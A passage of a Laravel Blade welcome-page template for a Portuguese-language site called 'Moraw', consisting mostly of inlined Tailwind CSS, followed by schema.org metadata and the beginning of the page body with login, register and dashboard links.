                    --color-rose-600: oklch(.586 .253 17.585);
                    --color-rose-700: oklch(.514 .222 16.935);
                    --color-rose-800: oklch(.455 .188 13.697);
                    --color-rose-900: oklch(.41 .159 10.272);
                    --color-rose-950: oklch(.271 .105 12.094);
                    --color-slate-50: oklch(.984 .003 247.858);
                    --color-slate-100: oklch(.968 .007 247.896);
                    --color-slate-200: oklch(.929 .013 255.508);
                    --color-slate-300: oklch(.869 .022 252.894);
                    --color-slate-400: oklch(.704 .04 256.788);
                    --color-slate-500: oklch(.554 .046 257.417);
                    --color-slate-600: oklch(.446 .043 257.281);
                    --color-slate-700: oklch(.372 .044 257.287);
                    --color-slate-800: oklch(.279 .041 260.031);
                    --color-slate-900: oklch(.208 .042 265.755);
                    --color-slate-950: oklch(.129 .042 264.695);
                    --color-gray-50: oklch(.985 .002 247.839);
                    --color-gray-100: oklch(.967 .003 264.542);
                    --color-gray-200: oklch(.928 .006 264.531);
                    --color-gray-300: oklch(.872 .01 258.338);
                    --color-gray-400: oklch(.707 .022 261.325);
                    --color-gray-500: oklch(.551 .027 264.364);
                    --color-gray-600: oklch(.446 .03 256.802);
                    --color-gray-700: oklch(.373 .034 259.733);
                    --color-gray-800: oklch(.278 .033 256.848);
                    --color-gray-900: oklch(.21 .034 264.665);
                    --color-gray-950: oklch(.13 .028 261.692);
                    --color-zinc-50: oklch(.985 0 0);
                    --color-zinc-100: oklch(.967 .001 286.375);
                    --color-zinc-200: oklch(.92 .004 286.32);
                    --color-zinc-300: oklch(.871 .006 286.286);
                    --color-zinc-400: oklch(.705 .015 286.067);
                    --color-zinc-500: oklch(.552 .016 285.938);
                    --color-zinc-600: oklch(.442 .017 285.786);
                    --color-zinc-700: oklch(.37 .013 285.805);
                    --color-zinc-800: oklch(.274 .006 286.033);
                    --color-zinc-900: oklch(.21 .006 285.885);
                    --color-zinc-950: oklch(.141 .005 285.823);
                    --color-neutral-50: oklch(.985 0 0);
                    --color-neutral-100: oklch(.97 0 0);
                    --color-neutral-200: oklch(.922 0 0);
                    --color-neutral-300: oklch(.87 0 0);
                    --color-neutral-400: oklch(.708 0 0);
                    --color-neutral-500: oklch(.556 0 0);
                    --color-neutral-600: oklch(.439 0 0);
                    --color-neutral-700: oklch(.371 0 0);
                    --color-neutral-800: oklch(.269 0 0);
                    --color-neutral-900: oklch(.205 0 0);
                    --color-neutral-950: oklch(.145 0 0);
                    --color-stone-50: oklch(.985 .001 106.423);
                    --color-stone-100: oklch(.97 .001 106.424);
                    --color-stone-200: oklch(.923 .003 48.717);
                    --color-stone-300: oklch(.869 .005 56.366);
                    --color-stone-400: oklch(.709 .01 56.259);
                    --color-stone-500: oklch(.553 .013 58.071);
                    --color-stone-600: oklch(.444 .011 73.639);
                    --color-stone-700: oklch(.374 .01 67.558);
                    --color-stone-800: oklch(.268 .007 34.298);
                    --color-stone-900: oklch(.216 .006 56.043);
                    --color-stone-950: oklch(.147 .004 49.25);
                    --color-black: #000;
                    --color-white: #fff;
                    --spacing: .25rem;
                    --breakpoint-sm: 40rem;
                    --breakpoint-md: 48rem;
                    --breakpoint-lg: 64rem;
                    --breakpoint-xl: 80rem;
                    --breakpoint-2xl: 96rem;
                    --container-3xs: 16rem;
                    --container-2xs: 18rem;
                    --container-xs: 20rem;
                    --container-sm: 24rem;
                    --container-md: 28rem;
                    --container-lg: 32rem;
                    --container-xl: 36rem;
                    --container-2xl: 42rem;
                    --container-3xl: 48rem;
                    --container-4xl: 56rem;
                    --container-5xl: 64rem;
                    --container-6xl: 72rem;
                    --container-7xl: 80rem;
                    --text-xs: .75rem;
                    --text-xs--line-height: calc(1/.75);
                    --text-sm: .875rem;
                    --text-sm--line-height: calc(1.25/.875);
                    --text-base: 1rem;
                    --text-base--line-height: 1.5;
                    --text-lg: 1.125rem;
                    --text-lg--line-height: calc(1.75/1.125);
                    --text-xl: 1.25rem;
                    --text-xl--line-height: calc(1.75/1.25);
                    --text-2xl: 1.5rem;
                    --text-2xl--line-height: calc(2/1.5);
                    --text-3xl: 1.875rem;
                    --text-3xl--line-height: 1.2;
                    --text-4xl: 2.25rem;
                    --text-4xl--line-height: calc(2.5/2.25);
                    --text-5xl: 3rem;
                    --text-5xl--line-height: 1;
                    --text-6xl: 3.75rem;
                    --text-6xl--line-height: 1;
                    --text-7xl: 4.5rem;
                    --text-7xl--line-height: 1;
                    --text-8xl: 6rem;
                    --text-8xl--line-height: 1;
                    --text-9xl: 8rem;
                    --text-9xl--line-height: 1;
                    --font-weight-thin: 100;
                    --font-weight-extralight: 200;
                    --font-weight-light: 300;
                    --font-weight-normal: 400;
                    --font-weight-medium: 500;
                    --font-weight-semibold: 600;
                    --font-weight-bold: 700;
                    --font-weight-extrabold: 800;
                    --font-weight-black: 900;
                    --tracking-tighter: -.05em;
                    --tracking-tight: -.025em;
                    --tracking-normal: 0em;
                    --tracking-wide: .025em;
                    --tracking-wider: .05em;
                    --tracking-widest: .1em;
                    --leading-tight: 1.25;
                    --leading-snug: 1.375;
                    --leading-normal: 1.5;
                    --leading-relaxed: 1.625;
                    --leading-loose: 2;
                    --radius-xs: .125rem;
                    --radius-sm: .25rem;
                    --radius-md: .375rem;
                    --radius-lg: .5rem;
                    --radius-xl: .75rem;
                    --radius-2xl: 1rem;
                    --radius-3xl: 1.5rem;
                    --radius-4xl: 2rem;
                    --shadow-2xs: 0 1px #0000000d;
                    --shadow-xs: 0 1px 2px 0 #0000000d;
                    --shadow-sm: 0 1px 3px 0 #0000001a, 0 1px 2px -1px #0000001a;
                    --shadow-md: 0 4px 6px -1px #0000001a, 0 2px 4px -2px #0000001a;
                    --shadow-lg: 0 10px 15px -3px #0000001a, 0 4px 6px -4px #0000001a;
                    --shadow-xl: 0 20px 25px -5px #0000001a, 0 8px 10px -6px #0000001a;
                    --shadow-2xl: 0 25px 50px -12px #00000040;
                    --inset-shadow-2xs: inset 0 1px #0000000d;
                    --inset-shadow-xs: inset 0 1px 1px #0000000d;
                    --inset-shadow-sm: inset 0 2px 4px #0000000d;
                    --drop-shadow-xs: 0 1px 1px #0000000d;
                    --drop-shadow-sm: 0 1px 2px #00000026;
                    --drop-shadow-md: 0 3px 3px #0000001f;
                    --drop-shadow-lg: 0 4px 4px #00000026;
                    --drop-shadow-xl: 0 9px 7px #0000001a;
                    --drop-shadow-2xl: 0 25px 25px #00000026;
                    --ease-in: cubic-bezier(.4, 0, 1, 1);
                    --ease-out: cubic-bezier(0, 0, .2, 1);
                    --ease-in-out: cubic-bezier(.4, 0, .2, 1);
                    --animate-spin: spin 1s linear infinite;
                    --animate-ping: ping 1s cubic-bezier(0, 0, .2, 1)infinite;
                    --animate-pulse: pulse 2s cubic-bezier(.4, 0, .6, 1)infinite;
                    --animate-bounce: bounce 1s infinite;
                    --blur-xs: 4px;
                    --blur-sm: 8px;
                    --blur-md: 12px;
                    --blur-lg: 16px;
                    --blur-xl: 24px;
                    --blur-2xl: 40px;
                    --blur-3xl: 64px;
                    --perspective-dramatic: 100px;
                    --perspective-near: 300px;
                    --perspective-normal: 500px;
                    --perspective-midrange: 800px;
                    --perspective-distant: 1200px;
                    --aspect-video: 16/9;
                    --default-transition-duration: .15s;
                    --default-transition-timing-function: cubic-bezier(.4, 0, .2, 1);
                    --default-font-family: var(--font-sans);
                    --default-font-feature-settings: var(--font-sans--font-feature-settings);
                    --default-font-variation-settings: var(--font-sans--font-variation-settings);
                    --default-mono-font-family: var(--font-mono);
                    --default-mono-font-feature-settings: var(--font-mono--font-feature-settings);
                    --default-mono-font-variation-settings: var(--font-mono--font-variation-settings)
                }
            }

            @layer base {

                *,
                :after,
                :before,
                ::backdrop {
                    box-sizing: border-box;
                    border: 0 solid;
                    margin: 0;
                    padding: 0
                }

                ::file-selector-button {
                    box-sizing: border-box;
                    border: 0 solid;
                    margin: 0;
                    padding: 0
                }

                html,
                :host {
                    -webkit-text-size-adjust: 100%;
                    -moz-tab-size: 4;
                    tab-size: 4;
                    line-height: 1.5;
                    font-family: var(--default-font-family, ui-sans-serif, system-ui, sans-serif, ""Apple Color Emoji"", ""Segoe UI Emoji"", ""Segoe UI Symbol"", ""Noto Color Emoji"");
                    font-feature-settings: var(--default-font-feature-settings, normal);
                    font-variation-settings: var(--default-font-variation-settings, normal);
                    -webkit-tap-highlight-color: transparent
                }

                body {
                    line-height: inherit
                }

                hr {
                    height: 0;
                    color: inherit;
                    border-top-width: 1px
                }

                abbr:where([title]) {
                    -webkit-text-decoration: underline dotted;
                    text-decoration: underline dotted
                }

                h1,
                h2,
                h3,
                h4,
                h5,
                h6 {
                    font-size: inherit;
                    font-weight: inherit
                }

                a {
                    color: inherit;
                    -webkit-text-decoration: inherit;
                    text-decoration: inherit
                }

                b,
                strong {
                    font-weight: bolder
                }

                code,
                kbd,
                samp,
                pre {
                    font-family: var(--default-mono-font-family, ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, ""Liberation Mono"", ""Courier New"", monospace);
                    font-feature-settings: var(--default-mono-font-feature-settings, normal);
                    font-variation-settings: var(--default-mono-font-variation-settings, normal);
                    font-size: 1em
                }

                small {
                    font-size: 80%
                }

                sub,
                sup {
                    vertical-align: baseline;
                    font-size: 75%;
                    line-height: 0;
                    position: relative
                }

                sub {
                    bottom: -.25em
                }

                sup {
                    top: -.5em
                }

                table {
                    text-indent: 0;
                    border-color: inherit;
                    border-collapse: collapse
                }

                :-moz-focusring {
                    outline: auto
                }

                progress {
                    vertical-align: baseline
                }

                summary {
                    display: list-item
                }

                ol,
                ul,
                menu {
                    list-style: none
                }

                img,
                svg,
                video,
                canvas,
                audio,
                iframe,
                embed,
                object {
                    vertical-align: middle;
                    display: block
                }

                img,
                video {
                    max-width: 100%;
                    height: auto
                }

                button,
                input,
                select,
                optgroup,
                textarea {
                    font: inherit;
                    font-feature-settings: inherit;
                    font-variation-settings: inherit;
                    letter-spacing: inherit;
                    color: inherit;
                    opacity: 1;
                    background-color: #0000;
                    border-radius: 0
                }

                ::file-selector-button {
                    font: inherit;
                    font-feature-settings: inherit;
                    font-variation-settings: inherit;
                    letter-spacing: inherit;
                    color: inherit;
                    opacity: 1;
                    background-color: #0000;
                    border-radius: 0
                }

                :where(select:is([multiple], [size])) optgroup {
                    font-weight: bolder
                }

                :where(select:is([multiple], [size])) optgroup option {
                    padding-inline-start: 20px
                }

                ::file-selector-button {
                    margin-inline-end: 4px
                }

                ::placeholder {
                    opacity: 1;
                    color: color-mix(in oklab, currentColor 50%, transparent)
                }

                textarea {
                    resize: vertical
                }

                ::-webkit-search-decoration {
                    -webkit-appearance: none
                }

                ::-webkit-date-and-time-value {
                    min-height: 1lh;
                    text-align: inherit
                }

                ::-webkit-datetime-edit {
                    display: inline-flex
                }

                ::-webkit-datetime-edit-fields-wrapper {
                    padding: 0
                }

                ::-webkit-datetime-edit {
                    padding-block: 0
                }

                ::-webkit-datetime-edit-year-field {
                    padding-block: 0
                }

                ::-webkit-datetime-edit-month-field {
                    padding-block: 0
                }

                ::-webkit-datetime-edit-day-field {
                    padding-block: 0
                }

                ::-webkit-datetime-edit-hour-field {
                    padding-block: 0
                }

                ::-webkit-datetime-edit-minute-field {
                    padding-block: 0
                }

                ::-webkit-datetime-edit-second-field {
                    padding-block: 0
                }

                ::-webkit-datetime-edit-millisecond-field {
                    padding-block: 0
                }

                ::-webkit-datetime-edit-meridiem-field {
                    padding-block: 0
                }

                :-moz-ui-invalid {
                    box-shadow: none
                }

                button,
                input:where([type=button], [type=reset], [type=submit]) {
                    -webkit-appearance: button;
                    -moz-appearance: button;
                    appearance: button
                }

                ::file-selector-button {
                    -webkit-appearance: button;
                    -moz-appearance: button;
                    appearance: button
                }

                ::-webkit-inner-spin-button {
                    height: auto
                }

                ::-webkit-outer-spin-button {
                    height: auto
                }

                [hidden]:where(:not([hidden=until-found])) {
                    display: none !important
                }
            }

            @layer components;

            @layer utilities {
                .absolute {
                    position: absolute
                }

                .relative {
                    position: relative
                }

                .static {
                    position: static
                }

                .inset-0 {
                    inset: calc(var(--spacing)*0)
                }

                .-mt-\[4\.9rem\] {
                    margin-top: -4.9rem
                }

                .-mb-px {
                    margin-bottom: -1px
                }

                .mb-1 {
                    margin-bottom: calc(var(--spacing)*1)
                }

                .mb-2 {
                    margin-bottom: calc(var(--spacing)*2)
                }

                .mb-4 {
                    margin-bottom: calc(var(--spacing)*4)
                }

                .mb-6 {
                    margin-bottom: calc(var(--spacing)*6)
                }

                .-ml-8 {
                    margin-left: calc(var(--spacing)*-8)
                }

                .flex {
                    display: flex
                }

                .hidden {
                    display: none
                }

                .inline-block {
                    display: inline-block
                }

                .inline-flex {
                    display: inline-flex
                }

                .table {
                    display: table
                }

                .aspect-\[335\/376\] {
                    aspect-ratio: 335/376
                }

                .h-1 {
                    height: calc(var(--spacing)*1)
                }

                .h-1\.5 {
                    height: calc(var(--spacing)*1.5)
                }

                .h-2 {
                    height: calc(var(--spacing)*2)
                }

                .h-2\.5 {
                    height: calc(var(--spacing)*2.5)
                }

                .h-3 {
                    height: calc(var(--spacing)*3)
                }

                .h-3\.5 {
                    height: calc(var(--spacing)*3.5)
                }

                .h-14 {
                    height: calc(var(--spacing)*14)
                }

                .h-14\.5 {
                    height: calc(var(--spacing)*14.5)
                }

                .min-h-screen {
                    min-height: 100vh
                }

                .w-1 {
                    width: calc(var(--spacing)*1)
                }

                .w-1\.5 {
                    width: calc(var(--spacing)*1.5)
                }

                .w-2 {
                    width: calc(var(--spacing)*2)
                }

                .w-2\.5 {
                    width: calc(var(--spacing)*2.5)
                }

                .w-3 {
                    width: calc(var(--spacing)*3)
                }

                .w-3\.5 {
                    width: calc(var(--spacing)*3.5)
                }

                .w-\[448px\] {
                    width: 448px
                }

                .w-full {
                    width: 100%
                }

                .max-w-\[335px\] {
                    max-width: 335px
                }

                .max-w-none {
                    max-width: none
                }

                .flex-1 {
                    flex: 1
                }

                .shrink-0 {
                    flex-shrink: 0
                }

                .translate-y-0 {
                    --tw-translate-y: calc(var(--spacing)*0);
                    translate: var(--tw-translate-x)var(--tw-translate-y)
                }

                .transform {
                    transform: var(--tw-rotate-x)var(--tw-rotate-y)var(--tw-rotate-z)var(--tw-skew-x)var(--tw-skew-y)
                }

                .flex-col {
                    flex-direction: column
                }

                .flex-col-reverse {
                    flex-direction: column-reverse
                }

                .items-center {
                    align-items: center
                }

                .justify-center {
                    justify-content: center
                }

                .justify-end {
                    justify-content: flex-end
                }

                .gap-3 {
                    gap: calc(var(--spacing)*3)
                }

                .gap-4 {
                    gap: calc(var(--spacing)*4)
                }

                :where(.space-x-1>:not(:last-child)) {
                    --tw-space-x-reverse: 0;
                    margin-inline-start: calc(calc(var(--spacing)*1)*var(--tw-space-x-reverse));
                    margin-inline-end: calc(calc(var(--spacing)*1)*calc(1 - var(--tw-space-x-reverse)))
                }

                .overflow-hidden {
                    overflow: hidden
                }

                .rounded-full {
                    border-radius: 3.40282e38px
                }

                .rounded-sm {
                    border-radius: var(--radius-sm)
                }

                .rounded-t-lg {
                    border-top-left-radius: var(--radius-lg);
                    border-top-right-radius: var(--radius-lg)
                }

                .rounded-br-lg {
                    border-bottom-right-radius: var(--radius-lg)
                }

                .rounded-bl-lg {
                    border-bottom-left-radius: var(--radius-lg)
                }

                .border {
                    border-style: var(--tw-border-style);
                    border-width: 1px
                }

                .border-\[\#19140035\] {
                    border-color: #19140035
                }

                .border-\[\#e3e3e0\] {
                    border-color: #e3e3e0
                }

                .border-black {
                    border-color: var(--color-black)
                }

                .border-transparent {
                    border-color: #0000
                }

                .bg-\[\#1b1b18\] {
                    background-color: #1b1b18
                }

                .bg-\[\#FDFDFC\] {
                    background-color: #fdfdfc
                }

                .bg-\[\#dbdbd7\] {
                    background-color: #dbdbd7
                }

                .bg-\[\#fff2f2\] {
                    background-color: #fff2f2
                }

                .bg-white {
                    background-color: var(--color-white)
                }

                .p-6 {
                    padding: calc(var(--spacing)*6)
                }

                .px-5 {
                    padding-inline: calc(var(--spacing)*5)
                }

                .py-1 {
                    padding-block: calc(var(--spacing)*1)
                }

                .py-1\.5 {
                    padding-block: calc(var(--spacing)*1.5)
                }

                .py-2 {
                    padding-block: calc(var(--spacing)*2)
                }

                .pb-12 {
                    padding-bottom: calc(var(--spacing)*12)
                }

                .text-sm {
                    font-size: var(--text-sm);
                    line-height: var(--tw-leading, var(--text-sm--line-height))
                }

                .text-\[13px\] {
                    font-size: 13px
                }

                .leading-\[20px\] {
                    --tw-leading: 20px;
                    line-height: 20px
                }

                .leading-normal {
                    --tw-leading: var(--leading-normal);
                    line-height: var(--leading-normal)
                }

                .font-medium {
                    --tw-font-weight: var(--font-weight-medium);
                    font-weight: var(--font-weight-medium)
                }

                .text-\[\#1b1b18\] {
                    color: #1b1b18
                }

                .text-\[\#706f6c\] {
                    color: #706f6c
                }

                .text-\[\#F53003\],
                .text-\[\#f53003\] {
                    color: #f53003
                }

                .text-white {
                    color: var(--color-white)
                }

                .underline {
                    text-decoration-line: underline
                }

                .underline-offset-4 {
                    text-underline-offset: 4px
                }

                .opacity-100 {
                    opacity: 1
                }

                .shadow-\[0px_0px_1px_0px_rgba\(0\,0\,0\,0\.03\)\,0px_1px_2px_0px_rgba\(0\,0\,0\,0\.06\)\] {
                    --tw-shadow: 0px 0px 1px 0px var(--tw-shadow-color, #00000008), 0px 1px 2px 0px var(--tw-shadow-color, #0000000f);
                    box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                }

                .shadow-\[inset_0px_0px_0px_1px_rgba\(26\,26\,0\,0\.16\)\] {
                    --tw-shadow: inset 0px 0px 0px 1px var(--tw-shadow-color, #1a1a0029);
                    box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                }

                .\!filter {
                    filter: var(--tw-blur, )var(--tw-brightness, )var(--tw-contrast, )var(--tw-grayscale, )var(--tw-hue-rotate, )var(--tw-invert, )var(--tw-saturate, )var(--tw-sepia, )var(--tw-drop-shadow, ) !important
                }

                .filter {
                    filter: var(--tw-blur, )var(--tw-brightness, )var(--tw-contrast, )var(--tw-grayscale, )var(--tw-hue-rotate, )var(--tw-invert, )var(--tw-saturate, )var(--tw-sepia, )var(--tw-drop-shadow, )
                }

                .transition-all {
                    transition-property: all;
                    transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
                    transition-duration: var(--tw-duration, var(--default-transition-duration))
                }

                .transition-opacity {
                    transition-property: opacity;
                    transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
                    transition-duration: var(--tw-duration, var(--default-transition-duration))
                }

                .delay-300 {
                    transition-delay: .3s
                }

                .duration-750 {
                    --tw-duration: .75s;
                    transition-duration: .75s
                }

                .not-has-\[nav\]\:hidden:not(:has(:is(nav))) {
                    display: none
                }

                .before\:absolute:before {
                    content: var(--tw-content);
                    position: absolute
                }

                .before\:top-0:before {
                    content: var(--tw-content);
                    top: calc(var(--spacing)*0)
                }

                .before\:top-1\/2:before {
                    content: var(--tw-content);
                    top: 50%
                }

                .before\:bottom-0:before {
                    content: var(--tw-content);
                    bottom: calc(var(--spacing)*0)
                }

                .before\:bottom-1\/2:before {
                    content: var(--tw-content);
                    bottom: 50%
                }

                .before\:left-\[0\.4rem\]:before {
                    content: var(--tw-content);
                    left: .4rem
                }

                .before\:border-l:before {
                    content: var(--tw-content);
                    border-left-style: var(--tw-border-style);
                    border-left-width: 1px
                }

                .before\:border-\[\#e3e3e0\]:before {
                    content: var(--tw-content);
                    border-color: #e3e3e0
                }

                @media (hover:hover) {
                    .hover\:border-\[\#1915014a\]:hover {
                        border-color: #1915014a
                    }

                    .hover\:border-\[\#19140035\]:hover {
                        border-color: #19140035
                    }

                    .hover\:border-black:hover {
                        border-color: var(--color-black)
                    }

                    .hover\:bg-black:hover {
                        background-color: var(--color-black)
                    }
                }

                @media (width>=64rem) {
                    .lg\:-mt-\[6\.6rem\] {
                        margin-top: -6.6rem
                    }

                    .lg\:mb-0 {
                        margin-bottom: calc(var(--spacing)*0)
                    }

                    .lg\:mb-6 {
                        margin-bottom: calc(var(--spacing)*6)
                    }

                    .lg\:-ml-px {
                        margin-left: -1px
                    }

                    .lg\:ml-0 {
                        margin-left: calc(var(--spacing)*0)
                    }

                    .lg\:block {
                        display: block
                    }

                    .lg\:aspect-auto {
                        aspect-ratio: auto
                    }

                    .lg\:w-\[438px\] {
                        width: 438px
                    }

                    .lg\:max-w-4xl {
                        max-width: var(--container-4xl)
                    }

                    .lg\:grow {
                        flex-grow: 1
                    }

                    .lg\:flex-row {
                        flex-direction: row
                    }

                    .lg\:justify-center {
                        justify-content: center
                    }

                    .lg\:rounded-t-none {
                        border-top-left-radius: 0;
                        border-top-right-radius: 0
                    }

                    .lg\:rounded-tl-lg {
                        border-top-left-radius: var(--radius-lg)
                    }

                    .lg\:rounded-r-lg {
                        border-top-right-radius: var(--radius-lg);
                        border-bottom-right-radius: var(--radius-lg)
                    }

                    .lg\:rounded-br-none {
                        border-bottom-right-radius: 0
                    }

                    .lg\:p-8 {
                        padding: calc(var(--spacing)*8)
                    }

                    .lg\:p-20 {
                        padding: calc(var(--spacing)*20)
                    }
                }

                @media (prefers-color-scheme:dark) {
                    .dark\:block {
                        display: block
                    }

                    .dark\:hidden {
                        display: none
                    }

                    .dark\:border-\[\#3E3E3A\] {
                        border-color: #3e3e3a
                    }

                    .dark\:border-\[\#eeeeec\] {
                        border-color: #eeeeec
                    }

                    .dark\:bg-\[\#0a0a0a\] {
                        background-color: #0a0a0a
                    }

                    .dark\:bg-\[\#1D0002\] {
                        background-color: #1d0002
                    }

                    .dark\:bg-\[\#3E3E3A\] {
                        background-color: #3e3e3a
                    }

                    .dark\:bg-\[\#161615\] {
                        background-color: #161615
                    }

                    .dark\:bg-\[\#eeeeec\] {
                        background-color: #eeeeec
                    }

                    .dark\:text-\[\#1C1C1A\] {
                        color: #1c1c1a
                    }

                    .dark\:text-\[\#A1A09A\] {
                        color: #a1a09a
                    }

                    .dark\:text-\[\#EDEDEC\] {
                        color: #ededec
                    }

                    .dark\:text-\[\#F61500\] {
                        color: #f61500
                    }

                    .dark\:text-\[\#FF4433\] {
                        color: #f43
                    }

                    .dark\:shadow-\[inset_0px_0px_0px_1px_\#fffaed2d\] {
                        --tw-shadow: inset 0px 0px 0px 1px var(--tw-shadow-color, #fffaed2d);
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }

                    .dark\:before\:border-\[\#3E3E3A\]:before {
                        content: var(--tw-content);
                        border-color: #3e3e3a
                    }

                    @media (hover:hover) {
                        .dark\:hover\:border-\[\#3E3E3A\]:hover {
                            border-color: #3e3e3a
                        }

                        .dark\:hover\:border-\[\#62605b\]:hover {
                            border-color: #62605b
                        }

                        .dark\:hover\:border-white:hover {
                            border-color: var(--color-white)
                        }

                        .dark\:hover\:bg-white:hover {
                            background-color: var(--color-white)
                        }
                    }
                }

                @starting-style {
                    .starting\:translate-y-4 {
                        --tw-translate-y: calc(var(--spacing)*4);
                        translate: var(--tw-translate-x)var(--tw-translate-y)
                    }
                }

                @starting-style {
                    .starting\:translate-y-6 {
                        --tw-translate-y: calc(var(--spacing)*6);
                        translate: var(--tw-translate-x)var(--tw-translate-y)
                    }
                }

                @starting-style {
                    .starting\:opacity-0 {
                        opacity: 0
                    }
                }
            }

            @keyframes spin {
                to {
                    transform: rotate(360deg)
                }
            }

            @keyframes ping {

                75%,
                to {
                    opacity: 0;
                    transform: scale(2)
                }
            }

            @keyframes pulse {
                50% {
                    opacity: .5
                }
            }

            @keyframes bounce {

                0%,
                to {
                    animation-timing-function: cubic-bezier(.8, 0, 1, 1);
                    transform: translateY(-25%)
                }

                50% {
                    animation-timing-function: cubic-bezier(0, 0, .2, 1);
                    transform: none
                }
            }

            @property --tw-translate-x {
                syntax: ""*"";
                inherits: false;
                initial-value: 0
            }

            @property --tw-translate-y {
                syntax: ""*"";
                inherits: false;
                initial-value: 0
            }

            @property --tw-translate-z {
                syntax: ""*"";
                inherits: false;
                initial-value: 0
            }

            @property --tw-rotate-x {
                syntax: ""*"";
                inherits: false;
                initial-value: rotateX(0)
            }

            @property --tw-rotate-y {
                syntax: ""*"";
                inherits: false;
                initial-value: rotateY(0)
            }

            @property --tw-rotate-z {
                syntax: ""*"";
                inherits: false;
                initial-value: rotateZ(0)
            }

            @property --tw-skew-x {
                syntax: ""*"";
                inherits: false;
                initial-value: skewX(0)
            }

            @property --tw-skew-y {
                syntax: ""*"";
                inherits: false;
                initial-value: skewY(0)
            }

            @property --tw-space-x-reverse {
                syntax: ""*"";
                inherits: false;
                initial-value: 0
            }

            @property --tw-border-style {
                syntax: ""*"";
                inherits: false;
                initial-value: solid
            }

            @property --tw-leading {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-font-weight {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-shadow {
                syntax: ""*"";
                inherits: false;
                initial-value: 0 0 #0000
            }

            @property --tw-shadow-color {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-inset-shadow {
                syntax: ""*"";
                inherits: false;
                initial-value: 0 0 #0000
            }

            @property --tw-inset-shadow-color {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-ring-color {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-ring-shadow {
                syntax: ""*"";
                inherits: false;
                initial-value: 0 0 #0000
            }

            @property --tw-inset-ring-color {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-inset-ring-shadow {
                syntax: ""*"";
                inherits: false;
                initial-value: 0 0 #0000
            }

            @property --tw-ring-inset {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-ring-offset-width {
                syntax: ""<length>"";
                inherits: false;
                initial-value: 0
            }

            @property --tw-ring-offset-color {
                syntax: ""*"";
                inherits: false;
                initial-value: #fff
            }

            @property --tw-ring-offset-shadow {
                syntax: ""*"";
                inherits: false;
                initial-value: 0 0 #0000
            }

            @property --tw-blur {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-brightness {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-contrast {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-grayscale {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-hue-rotate {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-invert {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-opacity {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-saturate {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-sepia {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-drop-shadow {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-duration {
                syntax: ""*"";
                inherits: false
            }

            @property --tw-content {
                syntax: ""*"";
                inherits: false;
                initial-value: """"
            }
        </style>
    @endif
    <script type=""application/ld+json"">
        {
          ""@context"": ""https://schema.org"",
          ""@type"": ""WebSite"",
          ""name"": ""Moraw"",
          ""url"": ""https://moraw.ct.ws"",
          ""description"": ""Desenvolvida com Laravel e Livewire."",
          ""author"": {
            ""@type"": ""Person"",
            ""name"": ""J.M.Moraes""
          }
        }
        </script>
</head>

<body
    class=""bg-[#FDFDFC] dark:bg-[#0a0a0a] text-[#1b1b18] flex p-6 lg:p-8 items-center lg:justify-center min-h-screen flex-col"">
    <header class=""w-full lg:max-w-4xl max-w-[335px] text-sm mb-6 not-has-[nav]:hidden"">
        @if (Route::has('login'))
            <nav class=""flex items-center justify-end gap-4"">
                @auth
                    <a href=""{{ url('/dashboard') }}""
                        class=""inline-block px-5 py-1.5 dark:text-[#EDEDEC] border-[#19140035] hover:border-[#1915014a] border text-[#1b1b18] dark:border-[#3E3E3A] dark:hover:border-[#62605b] rounded-sm text-sm leading-normal"">
                        Dashboard
                    </a>
                @else
                    <a href=""{{ route('login') }}""
                        class=""inline-block px-5 py-1.5 dark:text-[#EDEDEC] text-[#1b1b18] border border-transparent hover:border-[#19140035] dark:hover:border-[#3E3E3A] rounded-sm text-sm leading-normal"">
                        Log in
                    </a>

                    @if (Route::has('register'))
                        <a href=""{{ route('register') }}""
                            class=""inline-block px-5 py-1.5 dark:text-[#EDEDEC] border-[#19140035] hover:border-[#1915014a] border text-[#1b1b18] dark:border-[#3E3E3A] dark:hover:border-[#62605b] rounded-sm text-sm leading-normal"">
                            Register
                        </a>
                    @endif
                @endauth
            </nav>
        @endif
    </header>
    <div
        class=""flex items-center justify-center w-full transition-opacity opacity-100 duration-750 lg:grow starting:opacity-0"">
        <main class=""flex max-w-[335px] w-full flex-col-reverse lg:max-w-4xl lg:flex-row"">
            <div
                class=""text-[13px] leading-[20px] flex-1 p-6 pb-12 lg:p-20 bg-white dark:bg-[#161615] dark:text-[#EDEDEC] rounded-bl-lg rounded-br-lg lg:rounded-tl-lg lg:rounded-br-none"">
                <h1 class=""mb-1 font-medium"">Bem-vindo ao aplicativo do Moraes</h1>
                <p class=""mb-2 text-[#706f6c] dark:text-[#A1A09A]"">Um conjunto fundamental de operações para
                    gerenciamento de dados. <br>O seu companheiro para o dia a dia e para a vida.</p>
                <ul class=""flex flex-col mb-4 lg:mb-6"">
                    <li
                        class=""flex items-center gap-4 py-2 relative before:border-l before:border-[#e3e3e0] dark:before:border-[#3E3E3A] before:top-1/2 before:bottom-0 before:left-[0.4rem] before:absolute"">
                        <span class=""relative py-1 bg-white dark:bg-[#161615]"">
                            <span
